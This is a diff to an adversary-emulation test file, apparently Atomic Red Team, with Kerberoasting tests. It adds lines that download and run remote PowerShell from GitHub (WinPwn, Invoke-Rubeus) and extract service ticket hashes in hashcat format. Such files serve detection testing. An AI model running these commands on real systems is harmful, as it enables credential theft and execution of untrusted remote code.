@@ -36,24 +36,24 @@ atomic_tests:
   input_arguments:
     local_folder:
       description: Local path of Rubeus executable
-      type: Path
+      type: path
       default: $Env:temp
     local_executable:
       description: name of the rubeus executable
-      type: String
+      type: string
       default: 'rubeus.exe'
     out_file:
       description: file where command results are stored
-      type: String
+      type: string
       default: rubeus_output.txt
     rubeus_url:
       description: URL of Rubeus executable
-      type: Url
+      type: url
       default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
     flags:
       description: command flags you would like to run (optional and blank by default)
-      type: String
-      default: null
+      type: string
+      default:
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -70,6 +70,7 @@ atomic_tests:
       Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
   executor:
     command: |
+      klist purge
       cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"
     cleanup_command: |
       Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
@@ -86,7 +87,7 @@ atomic_tests:
   input_arguments:
     domain_name:
       description: The Domain Name to lookup against
-      type: String
+      type: string
       default: "%USERDNSDOMAIN%"
   dependency_executor_name: powershell
   dependencies:
@@ -133,7 +134,7 @@ atomic_tests:
   input_arguments:
     domain_name:
       description: The Domain Name to lookup against
-      type: String
+      type: string
       default: "%USERDNSDOMAIN%"
   dependency_executor_name: powershell
   dependencies:
@@ -147,4 +148,27 @@ atomic_tests:
     command: |
       Add-Type -AssemblyName System.IdentityModel  
       setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+    name: powershell
+
+- name: WinPwn - Kerberoasting
+  auto_generated_guid: 78d10e20-c874-45f2-a9df-6fea0120ec27
+  description: Kerberoasting technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      Kerberoasting -consoleoutput -noninteractive
+    name: powershell
+
+- name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
+  auto_generated_guid: 29094950-2c96-4cbd-b5e4-f7c65079678f
+  description: PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+      Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
     name: powershell
